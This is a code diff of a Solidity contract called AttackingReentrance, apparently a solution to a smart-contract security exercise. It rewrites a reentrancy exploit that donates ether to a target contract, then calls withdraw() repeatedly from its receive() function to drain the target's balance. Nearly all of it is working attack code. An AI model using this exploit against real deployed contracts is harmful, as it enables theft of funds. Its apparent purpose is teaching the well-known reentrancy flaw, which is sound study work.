@@ -15,29 +15,18 @@ contract AttackingReentrance {
 
     function hackContract() external payable {
         // Code me!
-        require(address(this).balance == 1,"Value not 1");
-        // re.donate{value: address(this).balance}(address(this));
-        // re.withdraw();
-       (bool sent,) =  payable(contractAddress).call{value: address(this).balance}(abi.encodeWithSignature("donate(address)",address(this)));
-        require(sent, "Failed to deposit");
-
-
-        (bool success,) = contractAddress.call(abi.encodeWithSignature("withdraw()"));
-        require(success,"Failed to withdraw");
-
-
+        re.donate{value: address(this).balance}(address(this));
+        re.withdraw();
 
     }
 
-    fallback() external payable {
+    receive() external payable {
 
         if (contractAddress.balance >= 1) {
-           (bool success,) = contractAddress.call(abi.encodeWithSignature("withdraw()"));
-            require(success,"Failed to withdraw");
+           re.withdraw();
         }
 
-        
-
+    
 
 
         }
